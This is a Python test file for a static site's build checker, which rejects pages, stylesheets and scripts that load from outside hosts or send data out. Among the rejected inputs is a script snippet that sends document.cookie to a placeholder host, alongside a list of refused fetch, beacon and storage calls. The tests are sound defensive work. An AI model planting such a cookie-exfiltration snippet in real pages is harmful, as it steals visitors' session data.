#!/usr/bin/env python3
"""Tests of site/build.py's checks: no page loads anything from elsewhere, and the site's script reads nothing of its
address but the fragment and sends nothing (the install page /get/ is opened by apps; docs/APP_PROTOCOL.md).

    python3 site/test_build.py
"""

import importlib.util
import os
import sys
import unittest

sys.dont_write_bytecode = True
spec = importlib.util.spec_from_file_location("build", os.path.join(os.path.dirname(os.path.abspath(__file__)), "build.py"))
build = importlib.util.module_from_spec(spec)
spec.loader.exec_module(build)


class Checks(unittest.TestCase):
    def refused(self, check, *args):
        with self.assertRaises(build.BuildError):
            check(*args)

    def test_pages_load_nothing_from_elsewhere(self):
        for page in [
            '<script src="https://cdn.example.com/a.js"></script>',
            "<script src='https://cdn.example.com/a.js'></script>",
            "<script src=https://cdn.example.com/a.js></script>",
            '<img src="/a.png" srcset="/a.png 1x, https://t.example.com/b.png 2x">',
            '<link rel="stylesheet" href="//fonts.example.com/x.css">',
            '<video poster="https://x.example/p.png"></video>',
            '<style>@import url("https://fonts.example.com/f.css");</style>',
            "<style>@import 'https://fonts.example.com/f.css';</style>",
            '<div style="background: url(https://x.example/a.png)"></div>',
            '<meta http-equiv="refresh" content="0; url=https://x.example/">',
            '<script>new Image().src = "https://x.example/?" + document.cookie</script>',
        ]:
            with self.subTest(page=page):
                self.refused(build.check_loads, "page", page)

    def test_what_the_site_does_passes(self):
        build.check_loads("page", '<link rel="canonical" href="https://agneta.dahlbom.io/get/"><link rel="stylesheet" href="/style.css">'
                          '<script src="/site.js" defer></script><img src="/a.png" srcset="/a.png 1x, /a@2x.png 2x">'
                          '<a href="https://github.com/olofd/agneta">source</a><a href="agneta://open">Open</a>')
        build.check_script("const arch = location.hash.slice(1); navigator.clipboard.writeText(text);")
        build.check_css("style.css", '.a { mask: url("data:image/svg+xml,%3Csvg%3E") } .b { background: url(/x.png) }')

    def test_the_script_reads_only_the_fragment_and_sends_nothing(self):
        for script in [
            "new URLSearchParams(location.search)", "const where = String(location)", "location.href",
            "document.referrer", "document.cookie", "fetch('/x')", "fetch ('/x')", "navigator.sendBeacon('/x')",
            "new XMLHttpRequest()", "new WebSocket('wss://x')", "import('https://x.example/m.js')",
            "new Image().src = '/x'", "img.src = url", "el.setAttribute('src', url)", "window.open(url)",
            "localStorage.setItem('a', 1)", "form.submit()",
        ]:
            with self.subTest(script=script):
                self.refused(build.check_script, script)

    def test_the_stylesheet_loads_nothing_from_elsewhere(self):
        self.refused(build.check_css, "style.css", "@import 'https://fonts.example.com/f.css';")
        self.refused(build.check_css, "style.css", "@font-face { src: url(https://fonts.example.com/f.woff2) }")

    def test_the_install_page_has_what_apps_promise(self):
        self.refused(build.check_get, "<html></html>")


if __name__ == "__main__":
    unittest.main()
